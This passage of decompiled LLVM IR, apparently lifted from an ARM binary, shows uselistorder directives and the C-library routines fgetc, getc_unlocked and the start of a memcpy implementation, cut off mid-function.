  uselistorder i32 %v2_1688c, { 0, 1, 3, 2 }
  uselistorder i32 %v4_16880, { 1, 2, 0 }
  uselistorder i32 %v0_16880, { 1, 0 }
  uselistorder i32 %v1_16888.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_16840, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v6_1683c, { 2, 1, 0 }
  uselistorder i32 %storemerge158, { 1, 0 }
  uselistorder i32 %v0_16800, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_167c8, { 1, 0 }
  uselistorder i32 %v1_167c8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_167c4, { 2, 4, 0, 1, 3, 5 }
  uselistorder i1 %v2_16724, { 2, 1, 0 }
  uselistorder i32 %v2_166a4, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v2_16694, { 1, 2, 3, 5, 0, 4, 6 }
  uselistorder i1 %v2_16680, { 1, 0, 2 }
  uselistorder i32 %v5_1667c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1670c30, { 3, 0, 4, 6, 1, 2, 5, 7, 8, 9 }
  uselistorder i1 %v2_16634, { 1, 0 }
  uselistorder i32 %v1_1662c, { 1, 2, 0 }
  uselistorder i32 %v2_16620, { 1, 0 }
  uselistorder i32 %v1_16620, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16620, { 3, 4, 0, 5, 6, 1, 2, 7 }
  uselistorder i1 %v3_165f0, { 1, 0 }
  uselistorder i32 %v0_165f0, { 0, 2, 1 }
  uselistorder i32 %v2_165ec, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_165d8, { 1, 0 }
  uselistorder i1 %v2_165c8, { 1, 0 }
  uselistorder i32 %v1_165c4, { 3, 2, 1, 0 }
  uselistorder i32 %v2_165c0, { 1, 0 }
  uselistorder i1 %v2_165b0, { 1, 0 }
  uselistorder i32 %v1_165a4, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_16558, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16558, { 1, 0, 2 }
  uselistorder i1 %v2_16540, { 1, 0 }
  uselistorder i32 %v5_16528, { 1, 0 }
  uselistorder i32 %v0_16514, { 1, 2, 0, 3 }
  uselistorder i32 %v0_164fc, { 1, 2, 0 }
  uselistorder i32 %v2_164f8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_16490, { 2, 4, 1, 0, 3 }
  uselistorder i32 %stack_var_-192.4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16438, { 1, 0 }
  uselistorder double %v2_163fc, { 1, 0 }
  uselistorder i32 %v0_163b8, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v3_163ac, { 1, 0 }
  uselistorder i32 %v2_163e8, { 1, 3, 0, 2 }
  uselistorder i32 %v0_1637c, { 1, 0 }
  uselistorder i32 %v5_16338, { 1, 0 }
  uselistorder i32 %v1_16258.v0_162445, { 1, 0 }
  uselistorder i32 %v3_16314, { 1, 0 }
  uselistorder i32 %v0_162f0, { 0, 2, 3, 1 }
  uselistorder i32 %v2_162d8, { 2, 1, 0 }
  uselistorder i32 %v0_162bc, { 1, 0 }
  uselistorder i32 %v0_161dc, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-83, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-82, { 1, 2, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-47, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32 %tmp160, { 1, 0, 2, 3 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 12, 11, 13 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 13, 14, 15, 5, 16, 17, 6, 18, 19, 20, 7, 21, 22, 8, 23, 24, 9, 10, 11, 12, 25, 26, 27, 28, 30, 29, 31, 32 }
  uselistorder i32* %r6.global-to-local, { 21, 0, 22, 1, 2, 3, 4, 19, 20, 5, 6, 9, 10, 11, 7, 12, 13, 8, 14, 17, 15, 16, 18 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 10, 11, 8, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 19, 21, 22, 23, 24, 25, 26, 27, 29, 43, 30, 34, 31, 32, 33, 35, 28, 36, 37, 38, 39, 40, 41, 42, 64, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 2, 65, 66, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 12, 15, 16, 13, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 8, 9, 1, 10, 11, 17, 21, 20, 18, 12, 13, 19, 14, 15, 5, 22, 16, 2, 23, 24, 4, 3, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 60, 18, 19, 20, 21, 22, 23, 24, 25, 59, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 61, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32 112, { 2, 11, 0, 12, 3, 1, 13, 4, 6, 5, 7, 8, 9, 10 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmpge, { 1, 0 }
  uselistorder i32 1104006501, { 4, 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33028), { 0, 2, 1 }
  uselistorder i32 1100470148, { 1, 2, 0, 3 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -33052), { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmplt, { 3, 2, 1, 0 }
  uselistorder double 0.000000e+00, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__aeabi_dcmpeq, { 2, 1, 0 }
  uselistorder i8 32, { 1, 3, 4, 5, 2, 6, 0, 7 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 2, 6, 5, 4, 3, 8, 7, 9 }
  uselistorder label %dec_label_pc_16964, { 1, 0 }
  uselistorder label %dec_label_pc_1691c, { 2, 0, 1 }
  uselistorder label %bb254, { 1, 0 }
  uselistorder label %dec_label_pc_1687c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_167f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_167c4, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_1679c, { 1, 0 }
  uselistorder label %dec_label_pc_16770, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1674c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1671c, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16664, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16654, { 1, 0 }
  uselistorder label %bb236, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %.thread145, { 1, 0 }
  uselistorder label %._crit_edge93, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_1657c, { 2, 1, 0 }
  uselistorder label %bb220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16488, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_16438, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16430, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %dec_label_pc_16314, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_16230, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1699c = load i32, i32* @r4, align 4
  store i32 %v3_1699c, i32* %stack_var_-16, align 4
  %v6_1699c = load i32, i32* @r5, align 4
  %v12_1699c = load i32, i32* @lr, align 4
  %v1_169a0 = add i32 %arg1, 52
  %v2_169a0 = inttoptr i32 %v1_169a0 to i32*
  %v3_169a0 = load i32, i32* %v2_169a0, align 4
  %v2_169a8 = icmp eq i32 %v3_169a0, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r6.global-to-local, align 4
  br i1 %v2_169a8, label %dec_label_pc_169e0, label %dec_label_pc_169bc

dec_label_pc_169bc:                               ; preds = %entry
  %v1_169bc = add i32 %arg1, 16
  %v2_169bc = inttoptr i32 %v1_169bc to i32*
  %v3_169bc = load i32, i32* %v2_169bc, align 4
  %v1_169c0 = add i32 %arg1, 24
  %v2_169c0 = inttoptr i32 %v1_169c0 to i32*
  %v3_169c0 = load i32, i32* %v2_169c0, align 4
  %v3_169c4 = icmp ult i32 %v3_169bc, %v3_169c0
  br i1 %v3_169c4, label %.thread, label %dec_label_pc_169d4

.thread:                                          ; preds = %dec_label_pc_169bc
  %v2_169c8 = inttoptr i32 %v3_169bc to i8*
  %v3_169c8 = load i8, i8* %v2_169c8, align 1
  %v4_169c8 = zext i8 %v3_169c8 to i32
  store i32 %v4_169c8, i32* %r4.global-to-local, align 4
  %v6_169c8 = add i32 %v3_169bc, 1
  store i32 %v6_169c8, i32* %v2_169bc, align 4
  br label %dec_label_pc_16a54

dec_label_pc_169d4:                               ; preds = %dec_label_pc_169bc
  %v1_169d4 = inttoptr i32 %arg1 to i16*
  %v2_169d4 = call i32 @getc_unlocked(i16* %v1_169d4)
  store i32 %v2_169d4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16a54

dec_label_pc_169e0:                               ; preds = %entry
  %v1_169e4 = add i32 %arg1, 56
  store i32 %v1_169e4, i32* @r4, align 4
  %v4_169f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_169f8)
  %v0_16a0c = load i32, i32* %r6.global-to-local, align 4
  %v2_16a0c = add i32 %v0_16a0c, 16
  %v3_16a0c = inttoptr i32 %v2_16a0c to i32*
  %v4_16a0c = load i32, i32* %v3_16a0c, align 4
  store i32 92696, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16a0c)
  %v0_16a18 = load i32, i32* @r5, align 4
  %v1_16a18 = add i32 %v0_16a18, 16
  %v2_16a18 = inttoptr i32 %v1_16a18 to i32*
  %v3_16a18 = load i32, i32* %v2_16a18, align 4
  %v1_16a1c = add i32 %v0_16a18, 24
  %v2_16a1c = inttoptr i32 %v1_16a1c to i32*
  %v3_16a1c = load i32, i32* %v2_16a1c, align 4
  %v3_16a20 = icmp ult i32 %v3_16a18, %v3_16a1c
  br i1 %v3_16a20, label %.thread2, label %dec_label_pc_16a30

.thread2:                                         ; preds = %dec_label_pc_169e0
  %v2_16a24 = inttoptr i32 %v3_16a18 to i8*
  %v3_16a24 = load i8, i8* %v2_16a24, align 1
  %v4_16a24 = zext i8 %v3_16a24 to i32
  store i32 %v4_16a24, i32* %r4.global-to-local, align 4
  %v6_16a24 = add i32 %v3_16a18, 1
  store i32 %v6_16a24, i32* %v2_16a18, align 4
  br label %dec_label_pc_16a3c

dec_label_pc_16a30:                               ; preds = %dec_label_pc_169e0
  %v1_16a34 = inttoptr i32 %v0_16a18 to i16*
  %v2_16a34 = call i32 @getc_unlocked(i16* %v1_16a34)
  store i32 %v2_16a34, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16a3c

dec_label_pc_16a3c:                               ; preds = %.thread2, %dec_label_pc_16a30
  %v0_16a48 = load i32, i32* %r6.global-to-local, align 4
  %v2_16a48 = add i32 %v0_16a48, 24
  %v3_16a48 = inttoptr i32 %v2_16a48 to i32*
  %v4_16a48 = load i32, i32* %v3_16a48, align 4
  store i32 %v4_16a48, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_16a48)
  br label %dec_label_pc_16a54

dec_label_pc_16a54:                               ; preds = %.thread, %dec_label_pc_169d4, %dec_label_pc_16a3c
  %v0_16a54 = load i32, i32* %r4.global-to-local, align 4
  %v2_16a5c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16a5c, i32* @r4, align 4
  store i32 %v6_1699c, i32* @r5, align 4
  store i32 %v12_1699c, i32* @lr, align 4
  ret i32 %v0_16a54

; uselistorder directives
  uselistorder i32 %v3_16a18, { 1, 0, 2 }
  uselistorder i32 %v3_169bc, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 4, 5, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_16a54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16a3c, { 1, 0 }
}

define i32 @function_16a68(i32 %arg1) local_unnamed_addr {
dec_label_pc_16a68:
  %v0_16a68 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16a68, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_16a68
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16a68, %bb
  %v10_16a74 = phi i32 [ %arg1, %dec_label_pc_16a68 ], [ 0, %bb ]
  ret i32 %v10_16a74

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_16a78 = load i32, i32* @r4, align 4
  store i32 %v3_16a78, i32* %stack_var_-12, align 4
  %v6_16a78 = load i32, i32* @r5, align 4
  %v9_16a78 = load i32, i32* @lr, align 4
  %v0_16a7c = load i32, i32* @r0, align 4
  %v1_16a7c = add i32 %v0_16a7c, 16
  %v2_16a7c = inttoptr i32 %v1_16a7c to i32*
  %v3_16a7c = load i32, i32* %v2_16a7c, align 4
  store i32 %v3_16a7c, i32* %r2.global-to-local, align 4
  %v1_16a80 = add i32 %v0_16a7c, 24
  %v2_16a80 = inttoptr i32 %v1_16a80 to i32*
  %v3_16a80 = load i32, i32* %v2_16a80, align 4
  %v3_16a84 = icmp ult i32 %v3_16a7c, %v3_16a80
  store i32 %v0_16a7c, i32* @r4, align 4
  br i1 %v3_16a84, label %bb, label %dec_label_pc_16aa4

bb:                                               ; preds = %entry
  %v2_16a90 = inttoptr i32 %v3_16a7c to i8*
  %v3_16a90 = load i8, i8* %v2_16a90, align 1
  %v4_16a90 = zext i8 %v3_16a90 to i32
  store i32 %v4_16a90, i32* %r0.global-to-local, align 4
  %v6_16a90 = add i32 %v3_16a7c, 1
  store i32 %v6_16a90, i32* %r2.global-to-local, align 4
  store i32 %v6_16a90, i32* %v2_16a7c, align 4
  br label %dec_label_pc_16b90

dec_label_pc_16aa4:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r5, align 4
  %v1_16aa4 = inttoptr i32 %v0_16a7c to i16*
  %v2_16aa4 = load i16, i16* %v1_16aa4, align 2
  %v3_16aa4 = zext i16 %v2_16aa4 to i32
  %v1_16aa8 = and i32 %v3_16aa4, 131
  %tmp25 = icmp ugt i32 %v1_16aa8, 128
  br i1 %tmp25, label %dec_label_pc_16ac4, label %dec_label_pc_16ab4

dec_label_pc_16ab4:                               ; preds = %dec_label_pc_16aa4
  store i32 128, i32* @r1, align 4
  %v0_16ab8 = call i32 @__stdio_trans2r_o()
  store i32 %v0_16ab8, i32* %r0.global-to-local, align 4
  %v2_16abc = icmp eq i32 %v0_16ab8, 0
  br i1 %v2_16abc, label %dec_label_pc_16ab4.dec_label_pc_16ac4_crit_edge, label %dec_label_pc_16b8c

dec_label_pc_16ab4.dec_label_pc_16ac4_crit_edge:  ; preds = %dec_label_pc_16ab4
  %v0_16ac4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16ac4

dec_label_pc_16ac4:                               ; preds = %dec_label_pc_16ab4.dec_label_pc_16ac4_crit_edge, %dec_label_pc_16aa4
  %v2_16b04 = phi i32 [ %v0_16ac4.pre, %dec_label_pc_16ab4.dec_label_pc_16ac4_crit_edge ], [ %v0_16a7c, %dec_label_pc_16aa4 ]
  %v1_16ac4 = inttoptr i32 %v2_16b04 to i16*
  %v2_16ac4 = load i16, i16* %v1_16ac4, align 2
  %v3_16ac4 = zext i16 %v2_16ac4 to i32
  store i32 %v3_16ac4, i32* %r2.global-to-local, align 4
  %v1_16ac8 = and i32 %v3_16ac4, 2
  %v2_16ac8 = icmp eq i32 %v1_16ac8, 0
  br i1 %v2_16ac8, label %dec_label_pc_16af4, label %dec_label_pc_16ad0

dec_label_pc_16ad0:                               ; preds = %dec_label_pc_16ac4
  %tmp26 = urem i16 %v2_16ac4, 2
  %v1_16ad0 = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_16ad0
  %v4_16ad4 = and i32 %tmp22, 4
  %v5_16ad4 = add i32 %v4_16ad4, %v2_16b04
  %v1_16ad8 = add i32 %v5_16ad4, 36
  %v2_16ad8 = inttoptr i32 %v1_16ad8 to i8*
  %v3_16ad8 = load i8, i8* %v2_16ad8, align 1
  %v4_16ad8 = zext i8 %v3_16ad8 to i32
  %v1_16adc = add nsw i32 %v3_16ac4, -1
  store i32 %v1_16adc, i32* %r2.global-to-local, align 4
  store i32 %v4_16ad8, i32* %r0.global-to-local, align 4
  %v2_16ae8 = add i32 %v2_16b04, 40
  %v3_16ae8 = inttoptr i32 %v2_16ae8 to i32*
  store i32 0, i32* %v3_16ae8, align 4
  %v0_16aec = load i32, i32* %r2.global-to-local, align 4
  %v1_16aec = trunc i32 %v0_16aec to i16
  %v2_16aec = load i32, i32* @r4, align 4
  %v3_16aec = inttoptr i32 %v2_16aec to i16*
  store i16 %v1_16aec, i16* %v3_16aec, align 2
  br label %dec_label_pc_16b90

dec_label_pc_16af4:                               ; preds = %dec_label_pc_16ac4
  %v1_16af4 = add i32 %v2_16b04, 16
  %v1_16af8 = inttoptr i32 %v1_16af4 to i32*
  %v2_16af8 = load i32, i32* %v1_16af8, align 4
  %v3_16af8 = add i32 %v2_16b04, 20
  %v4_16af8 = inttoptr i32 %v3_16af8 to i32*
  %v5_16af8 = load i32, i32* %v4_16af8, align 4
  %v9_16afc = icmp eq i32 %v5_16af8, %v2_16af8
  br i1 %v9_16afc, label %dec_label_pc_16b0c, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16af4
  %v2_16b00 = inttoptr i32 %v2_16af8 to i8*
  %v3_16b00 = load i8, i8* %v2_16b00, align 1
  %v4_16b00 = zext i8 %v3_16b00 to i32
  store i32 %v4_16b00, i32* %r0.global-to-local, align 4
  %v6_16b00 = add i32 %v2_16af8, 1
  store i32 %v6_16b00, i32* %v1_16af8, align 4
  br label %dec_label_pc_16b90

dec_label_pc_16b0c:                               ; preds = %dec_label_pc_16af4
  %v1_16b0c = add i32 %v2_16b04, 4
  %v2_16b0c = inttoptr i32 %v1_16b0c to i32*
  %v3_16b0c = load i32, i32* %v2_16b0c, align 4
  %v7_16b10 = icmp eq i32 %v3_16b0c, -2
  br i1 %v7_16b10, label %.thread7, label %dec_label_pc_16b24

.thread7:                                         ; preds = %dec_label_pc_16b0c
  %v2_16b14 = or i16 %v2_16ac4, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_16b14, i16* %v1_16ac4, align 2
  br label %dec_label_pc_16b90

dec_label_pc_16b24:                               ; preds = %dec_label_pc_16b0c
  %v1_16b24 = and i32 %v3_16ac4, 768
  %v2_16b24 = icmp eq i32 %v1_16b24, 0
  br i1 %v2_16b24, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_16b24
  %v1_16b2c = load i32, i32* @r5, align 4
  %v3_16b2c = add i32 %v1_16b2c, 48
  %v4_16b2c = inttoptr i32 %v3_16b2c to i32*
  %v5_16b2c = load i32, i32* %v4_16b2c, align 4
  store i32 %v5_16b2c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_16b24, %bb23
  %v1_16b30 = xor i1 %v2_16b24, true
  call void @__pseudo_cond_branch(i1 %v1_16b30, i32 ptrtoint (i32* @global_var_116c4.594 to i32))
  %v0_16b34 = load i32, i32* @r4, align 4
  %v1_16b34 = add i32 %v0_16b34, 8
  store i32 %v1_16b34, i32* %r2.global-to-local, align 4
  %v1_16b38 = inttoptr i32 %v1_16b34 to i32*
  %v2_16b38 = load i32, i32* %v1_16b38, align 4
  store i32 %v2_16b38, i32* %r2.global-to-local, align 4
  %v3_16b38 = add i32 %v0_16b34, 12
  %v4_16b38 = inttoptr i32 %v3_16b38 to i32*
  %v5_16b38 = load i32, i32* %v4_16b38, align 4
  %v9_16b3c = icmp eq i32 %v5_16b38, %v2_16b38
  br i1 %v9_16b3c, label %dec_label_pc_16b70, label %dec_label_pc_16b44

dec_label_pc_16b44:                               ; preds = %.thread9
  %v2_16b44 = add i32 %v0_16b34, 24
  %v3_16b44 = inttoptr i32 %v2_16b44 to i32*
  store i32 %v2_16b38, i32* %v3_16b44, align 4
  %v0_16b48 = load i32, i32* @r4, align 4
  store i32 %v0_16b48, i32* %r0.global-to-local, align 4
  %v2_16b4c = call i32 @__stdio_rfill(i32 %v0_16b48)
  store i32 %v2_16b4c, i32* %r0.global-to-local, align 4
  %v2_16b50 = icmp eq i32 %v2_16b4c, 0
  br i1 %v2_16b50, label %dec_label_pc_16b8c, label %dec_label_pc_16b58

dec_label_pc_16b58:                               ; preds = %dec_label_pc_16b44
  %v0_16b58 = load i32, i32* @r4, align 4
  %v1_16b58 = add i32 %v0_16b58, 20
  %v2_16b58 = inttoptr i32 %v1_16b58 to i32*
  %v3_16b58 = load i32, i32* %v2_16b58, align 4
  %v2_16b5c = add i32 %v0_16b58, 24
  %v3_16b5c = inttoptr i32 %v2_16b5c to i32*
  store i32 %v3_16b58, i32* %v3_16b5c, align 4
  %v0_16b60 = load i32, i32* @r4, align 4
  %v1_16b60 = add i32 %v0_16b60, 16
  %v2_16b60 = inttoptr i32 %v1_16b60 to i32*
  %v3_16b60 = load i32, i32* %v2_16b60, align 4
  %v1_16b64 = inttoptr i32 %v3_16b60 to i8*
  %v2_16b64 = load i8, i8* %v1_16b64, align 1
  %v3_16b64 = zext i8 %v2_16b64 to i32
  store i32 %v3_16b64, i32* %r0.global-to-local, align 4
  %v5_16b64 = add i32 %v3_16b60, 1
  store i32 %v5_16b64, i32* %v2_16b60, align 4
  br label %dec_label_pc_16b90

dec_label_pc_16b70:                               ; preds = %.thread9
  %v1_16b70 = inttoptr i32 %v0_16b34 to i16*
  store i32 %v0_16b34, i32* %r0.global-to-local, align 4
  %v2_16b74 = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_16b7c = call i32 @__stdio_READ(i16* %v1_16b70, i32 %v2_16b74, i32 1)
  store i32 %v5_16b7c, i32* %r0.global-to-local, align 4
  %v2_16b80 = icmp eq i32 %v5_16b7c, 0
  br i1 %v2_16b80, label %dec_label_pc_16b8c, label %bb24

bb24:                                             ; preds = %dec_label_pc_16b70
  %v4_16b84 = load i8, i8* %stack_var_-17, align 1
  %v5_16b84 = sext i8 %v4_16b84 to i32
  store i32 %v5_16b84, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16b90

dec_label_pc_16b8c:                               ; preds = %dec_label_pc_16b70, %dec_label_pc_16ab4, %dec_label_pc_16b44
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16b90

dec_label_pc_16b90:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_16b58, %dec_label_pc_16ad0, %dec_label_pc_16b8c
  %v2_16b94 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16b94, i32* @r4, align 4
  store i32 %v6_16a78, i32* @r5, align 4
  store i32 %v9_16a78, i32* @lr, align 4
  %v1_16b98 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16b98

; uselistorder directives
  uselistorder i32 %v2_16af8, { 1, 0, 2 }
  uselistorder i32 %v2_16b04, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_16a7c, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder label %dec_label_pc_16b90, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_16b8c, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_16bb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16bb0 = load i32, i32* %r0.global-to-local, align 4
  %v2_16bb0 = sub i32 %v0_16bb0, %v1_16bb0
  %v3_16bb0 = icmp ult i32 %v0_16bb0, %v1_16bb0
  %v4_16bb0 = xor i32 %v1_16bb0, %v0_16bb0
  %v5_16bb0 = xor i32 %v2_16bb0, %v0_16bb0
  %v6_16bb0 = and i32 %v5_16bb0, %v4_16bb0
  %v7_16bb0 = icmp slt i32 %v6_16bb0, 0
  store i1 %v7_16bb0, i1* %cpsr_v.global-to-local, align 1
  %v8_16bb0 = icmp slt i32 %v2_16bb0, 0
  store i1 %v8_16bb0, i1* %cpsr_n.global-to-local, align 1
  %v9_16bb0 = icmp eq i32 %v0_16bb0, %v1_16bb0
  store i1 %v9_16bb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16bb0, label %dec_label_pc_16e04, label %dec_label_pc_16bb8

dec_label_pc_16bb8:                               ; preds = %entry
  br i1 %v9_16bb0, label %.thread129, label %bb

.thread129:                                       ; preds = %bb153, %.thread128, %bb150, %dec_label_pc_16bb8
  %merge = phi i32 [ %v0_16bb0, %dec_label_pc_16bb8 ], [ %v2_16e98, %bb150 ], [ %v11_16eb4, %bb153 ], [ %v7_16eb4, %.thread128 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_16bb8
  %v5_16bbc = inttoptr i32 %v1_16bb0 to i8*
  store i8* %v5_16bbc, i8** %stack_var_-8, align 4
  %v8_16bbc = load i32, i32* @lr, align 4
  %v0_16bc0 = load i32, i32* @r2, align 4
  %v2_16bc0 = add i32 %v0_16bc0, -4
  store i32 %v2_16bc0, i32* %r2.global-to-local, align 4
  %v4_16bc0 = sub i32 3, %v0_16bc0
  %v5_16bc0 = and i32 %v4_16bc0, %v0_16bc0
  %v6_16bc0 = icmp slt i32 %v5_16bc0, 0
  store i1 %v6_16bc0, i1* %cpsr_v.global-to-local, align 1
  %v7_16bc0 = icmp slt i32 %v2_16bc0, 0
  store i1 %v7_16bc0, i1* %cpsr_n.global-to-local, align 1
  %v8_16bc0 = icmp eq i32 %v0_16bc0, 4
  store i1 %v8_16bc0, i1* %cpsr_z.global-to-local, align 1
  %v5_16bc4 = icmp slt i32 %v0_16bc0, 4
